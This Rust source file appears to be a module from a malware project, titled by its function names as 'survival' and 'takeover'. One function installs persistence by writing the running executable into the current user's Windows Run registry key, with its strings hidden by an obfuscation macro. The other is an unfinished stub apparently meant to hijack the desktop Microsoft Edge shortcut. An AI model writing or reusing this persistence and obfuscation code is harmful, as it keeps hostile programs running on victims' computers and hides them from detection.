use std::env;
use std::path::Path;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use goldberg::goldberg_string;
use crate::debug_println;

#[inline]
pub fn shortcut_takeover(id: &str, hostname: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    let desktop_dir_path = format!("C:\\Users\\{}\\Desktop", hostname);

    let edge_bin_path = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"); 
    let edge_dir_path = goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
    let edge_shortcut_path = format!("{}\\Microsoft Edge", desktop_dir_path);

    if !Path::new(&edge_shortcut_path).exists() {
        return Ok(());
    }

    return Ok(());
}

#[inline]
pub fn classic_registry_based_survival(program_name_in_registry_record: &str, id: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    if program_name_in_registry_record.is_empty() {
        return Err("Program name cannot be empty".into());
    }

    if id.is_empty() {
        return Err("ID cannot be empty".into());
    }

    let exe_path: PathBuf = env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Failed to convert path to string")?;

    let hklm = RegKey::predef(HKEY_CURRENT_USER);

    let run_path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    let command = format!("\"{}\" {}", exe_path_str, id);

    match hklm.create_subkey(&run_path) {
        Err(e) => Err(Box::new(e) as Box<dyn std::error::Error>),
        Ok((key, _disp)) => {
            key.set_value(program_name_in_registry_record, &command)?;
            debug_println!("Set persistence in Run path with ID: {}", run_path);
            Ok(())
        }
    }
}